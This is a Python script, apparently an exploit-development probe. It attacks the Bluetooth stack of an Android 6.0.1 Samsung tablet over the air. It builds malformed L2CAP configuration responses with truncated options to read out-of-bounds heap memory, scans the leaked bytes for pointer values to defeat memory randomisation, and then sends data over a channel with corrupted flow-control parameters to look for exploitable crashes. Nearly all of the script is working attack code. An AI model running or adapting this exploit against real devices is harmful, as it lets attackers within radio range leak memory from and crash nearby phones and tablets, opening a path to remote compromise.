#!/usr/bin/env python3
"""
OOB Heap Read Probe v2 — Extended leak + FCR corruption testing
Target: SM-T377A bluetooth.default.so (Bluedroid Android 6.0.1)

Confirmed: RFC OOB probe works (10 byte heap read, target survives).
Now: try QOS (24 byte leak), try multiple rounds, and test if corrupted
FCR params cause exploitable behavior when we send data on the channel.

Usage: sudo python3 oob_probe_v2.py 02:00:00:00:00:21
"""
import struct, sys, time, os, socket as _socket
from scapy.layers.bluetooth import *
from scapy.packet import Raw
import subprocess

TARGET = sys.argv[1] if len(sys.argv) > 1 else '02:00:00:00:00:21'

def bt_recv(bt, timeout=0.5):
    bt.ins.settimeout(timeout)
    try: return bt.recv()
    except: return None

def l2cmd(code, ident, data):
    return struct.pack('<BBH', code, ident, len(data)) + data

def recv_sig(bt, timeout=2):
    p = bt_recv(bt, timeout)
    if p is None: return None
    raw = bytes(p)
    for i in range(len(raw) - 8):
        try:
            ll, lc = struct.unpack('<HH', raw[i:i+4])
            if lc == 1 and 4 <= ll <= 500 and i + 4 + ll <= len(raw):
                return raw[i+4:i+4+ll]
        except: continue
    return None

def build_oob_conf_rsp(ident, scid, boundary_type, num_fillers=0):
    """Build CONF_RSP(UNACCEPT) with truncated boundary option for OOB read."""
    payload = struct.pack('<HHH', scid, 0x0000, 0x0001)  # UNACCEPT
    for _ in range(num_fillers):
        payload += bytes([0x01, 0x02, 0x00, 0x02])  # MTU filler
    payload += bytes([boundary_type])  # just the type byte — data read from heap
    return l2cmd(0x05, ident, payload)

# ============================================================
print(f'=== OOB Heap Read v2 | {TARGET} ===\n')
subprocess.run(['systemctl', 'stop', 'bluetooth'], capture_output=True)
subprocess.run(['hciconfig', 'hci0', 'down'], capture_output=True)
time.sleep(0.5)

bt = BluetoothUserSocket(0)
bt.send(HCI_Hdr(type=1) / HCI_Command_Hdr(ogf=0x03, ocf=0x0003))
time.sleep(1)
for _ in range(10): bt_recv(bt, 0.3)
bt.send(HCI_Hdr(type=1) / HCI_Command_Hdr(ogf=0x03, ocf=0x001a, len=1) / Raw(b'\x03'))
time.sleep(0.3)
for _ in range(5): bt_recv(bt, 0.3)

# ACL connect
print(f'[*] ACL connecting...')
addr = bytes.fromhex(TARGET.replace(':', ''))[::-1]
params = addr + struct.pack('<HBBHB', 0xCC18, 0x02, 0x00, 0x0000, 0x01)
bt.send(HCI_Hdr(type=1) / HCI_Command_Hdr(ogf=0x01, ocf=0x0005, len=len(params)) / Raw(params))

handle = None
for _ in range(60):
    p = bt_recv(bt, 1)
    if p and HCI_Event_Hdr in p and p[HCI_Event_Hdr].code == 0x03:
        raw_d = bytes(p[HCI_Event_Hdr].payload)
        if len(raw_d) >= 3 and raw_d[0] == 0:
            handle = struct.unpack('<H', raw_d[1:3])[0]
            print(f'[+] ACL handle=0x{handle:04x}')
            break
if not handle:
    print('[-] ACL failed'); bt.close(); sys.exit(1)
time.sleep(0.3)

def send_sig(data):
    bt.send(HCI_Hdr(type=2) / HCI_ACL_Hdr(handle=handle, PB=0, BC=0) / L2CAP_Hdr(cid=1) / Raw(data))

# L2CAP channel setup
print('[*] Establishing L2CAP channel...')
send_sig(l2cmd(0x02, 1, struct.pack('<HH', 0x0001, 0x0040)))

target_dcid = None
nid = 2
conf_req_ident = None

for _ in range(40):
    sig = recv_sig(bt, 1)
    if sig is None: continue
    if len(sig) < 4: continue
    code, ident = sig[0], sig[1]
    slen = struct.unpack('<H', sig[2:4])[0]
    sd = sig[4:4+slen]

    if code == 0x0a:  # INFO_REQ
        it = struct.unpack('<H', sd[:2])[0]
        if it == 2:
            send_sig(l2cmd(0x0b, ident, struct.pack('<HHI', 2, 0, 0xB8)))
        elif it == 3:
            send_sig(l2cmd(0x0b, ident, struct.pack('<HH', 3, 0) + b'\x02' + b'\x00' * 7))
        else:
            send_sig(l2cmd(0x0b, ident, struct.pack('<HH', it, 1)))
        if not target_dcid:
            send_sig(l2cmd(0x02, nid, struct.pack('<HH', 0x0001, 0x0040)))
            nid += 1
    elif code == 0x03:  # CONN_RSP
        dc, sc, res, st = struct.unpack('<HHHH', sd[:8])
        if res == 0: target_dcid = dc
    elif code == 0x04:  # CONF_REQ
        conf_req_ident = ident
        # Send our CONF_REQ first
        send_sig(l2cmd(0x04, nid, struct.pack('<HH', target_dcid, 0) + bytes([0x01, 0x02, 0x00, 0x02])))
        nid += 1
        break

if not target_dcid:
    print('[-] Channel failed'); bt.close(); sys.exit(1)

# Get target's CONF_RSP
for _ in range(10):
    sig = recv_sig(bt, 1)
    if sig and sig[0] == 0x05: break

print(f'[+] Channel ready: DCID=0x{target_dcid:04x}\n')

# ============================================================
# PROBE SERIES: Try different OOB option types
# ============================================================
all_responses = {}

for probe_name, opt_type, opt_read_size in [
    ('MTU (4B read, ~2B OOB)', 1, 4),
    ('RFC (11B read, ~9B OOB)', 4, 11),
    ('EFS (18B read, ~16B OOB)', 6, 18),
    ('QOS (24B read, ~22B OOB)', 3, 24),
]:
    print(f'[*] Probe: {probe_name}')
    oob = build_oob_conf_rsp(conf_req_ident, target_dcid, opt_type, 0)
    print(f'    Sending: {oob.hex()}')
    send_sig(oob)

    responses = []
    start = time.time()
    while time.time() - start < 3:
        sig = recv_sig(bt, 0.5)
        if sig and len(sig) >= 4:
            code = sig[0]
            slen = struct.unpack('<H', sig[2:4])[0]
            sd = sig[4:4+slen]
            responses.append(sig)
            print(f'    [<-] code=0x{code:02x} len={len(sig)} hex={sig.hex()}')

            if code == 0x04:  # New CONF_REQ with renegotiated params
                print(f'         CONF_REQ options: {sd[4:].hex() if len(sd) > 4 else "none"}')
                # This CONF_REQ replaces the original — update the ident for next probe
                conf_req_ident = sig[1]
                # Parse ALL options looking for corrupted values
                opts = sd[4:] if len(sd) > 4 else b''
                pos = 0
                while pos + 2 <= len(opts):
                    ot = opts[pos] & 0x7f
                    ol = opts[pos+1]
                    od = opts[pos+2:pos+2+ol]
                    val_desc = ''
                    if ot == 1 and len(od) >= 2:
                        mtu = struct.unpack('<H', od[:2])[0]
                        val_desc = f' MTU={mtu}'
                    elif ot == 4 and len(od) >= 9:
                        mode, txwin, maxtx = od[0], od[1], od[2]
                        rtx = struct.unpack('<H', od[3:5])[0]
                        mtx = struct.unpack('<H', od[5:7])[0]
                        mps = struct.unpack('<H', od[7:9])[0]
                        val_desc = f' mode={mode} txwin={txwin} maxtx={maxtx} rtx={rtx} mtx={mtx} mps={mps}'
                    elif ot == 6 and len(od) >= 16:
                        val_desc = f' EFS={od.hex()}'
                    print(f'         opt type={ot} len={ol}{val_desc} raw={od.hex()}')
                    # Check for pointer-like values
                    for j in range(0, len(od) - 3):
                        if j + 4 <= len(od):
                            v = struct.unpack('<I', od[j:j+4])[0]
                            if 0xb6000000 <= v <= 0xb8000000:
                                print(f'         *** HEAP/LIB POINTER: 0x{v:08x} at opt offset {j} ***')
                            elif 0xa0000000 <= v <= 0xbfffffff and v != 0xb6000000:
                                print(f'         *** POSSIBLE POINTER: 0x{v:08x} at opt offset {j} ***')
                    pos += 2 + ol

            elif code == 0x05:  # CONF_RSP
                rr = struct.unpack('<H', sd[4:6])[0] if len(sd) >= 6 else -1
                print(f'         CONF_RSP result={rr}')

            elif code == 0x06:  # DISCONN_REQ
                print(f'         DISCONN_REQ — target is disconnecting')

    all_responses[probe_name] = responses

    if not responses:
        # Check alive
        send_sig(l2cmd(0x08, 0x42, b'PING'))
        pong = recv_sig(bt, 2)
        if pong:
            print(f'    Target alive but no response')
        else:
            print(f'    *** TARGET DOWN ***')
            break

    print()
    time.sleep(0.5)

# ============================================================
# If channel is still alive, try sending data to trigger FCR with corrupted params
# ============================================================
print('=' * 50)
print(' TESTING FCR BEHAVIOR WITH CORRUPTED PARAMS')
print('=' * 50)

# First, respond to the latest CONF_REQ to move toward OPEN state
# Then send data — if max_pdu_size was corrupted, the buffer allocation may fail
if conf_req_ident:
    # Accept the renegotiation
    send_sig(l2cmd(0x05, conf_req_ident, struct.pack('<HHH', 0x0040, 0, 0)))
    print('[->] CONF_RSP(SUCCESS) to latest CONF_REQ')
    time.sleep(0.5)

    # Send our CONF_REQ so channel can transition to OPEN
    send_sig(l2cmd(0x04, nid, struct.pack('<HH', target_dcid, 0) + bytes([0x01, 0x02, 0x00, 0x02])))
    nid += 1
    print('[->] Our CONF_REQ')

    for _ in range(10):
        sig = recv_sig(bt, 1)
        if sig and sig[0] == 0x05:
            rr = struct.unpack('<H', sig[8:10])[0] if len(sig) >= 10 else -1
            print(f'[<-] CONF_RSP result={rr}')
            break
        elif sig:
            print(f'[<-] code=0x{sig[0]:02x}')

    # Now try sending SDP data on the channel
    print('\n[*] Sending data on channel with corrupted FCR params...')
    # SDP ServiceSearchRequest
    sdp_req = b'\x02\x00\x01\x00\x08\x35\x03\x19\x01\x00\xff\xff\x00'
    pkt = HCI_Hdr(type=2) / HCI_ACL_Hdr(handle=handle, PB=0, BC=0) / L2CAP_Hdr(cid=target_dcid) / Raw(sdp_req)
    bt.send(pkt)
    print(f'[->] SDP request on CID 0x{target_dcid:04x}')

    for _ in range(5):
        sig = recv_sig(bt, 1)
        if sig:
            print(f'[<-] code=0x{sig[0]:02x} data={sig.hex()[:60]}')

    # Check for any ACL data (not just signaling)
    for _ in range(5):
        p = bt_recv(bt, 1)
        if p:
            raw = bytes(p)
            if len(raw) > 9:
                ll, lc = struct.unpack('<HH', raw[5:9]) if len(raw) >= 9 else (0, 0)
                if lc == target_dcid or lc == 0x0040:
                    print(f'[<-] DATA on CID 0x{lc:04x}: {raw[9:9+min(ll,40)].hex()}')

# Cleanup
print('\n[*] Done. Disconnecting...')
try:
    bt.send(HCI_Hdr(type=1) / HCI_Command_Hdr(ogf=0x01, ocf=0x0006, len=3) / Raw(struct.pack('<HB', handle, 0x13)))
except: pass
time.sleep(0.3)
bt.close()

# Summary
print('\n=== RESULTS ===')
for name, resps in all_responses.items():
    status = f'{len(resps)} responses' if resps else 'NO RESPONSE (crash?)'
    print(f'  {name}: {status}')
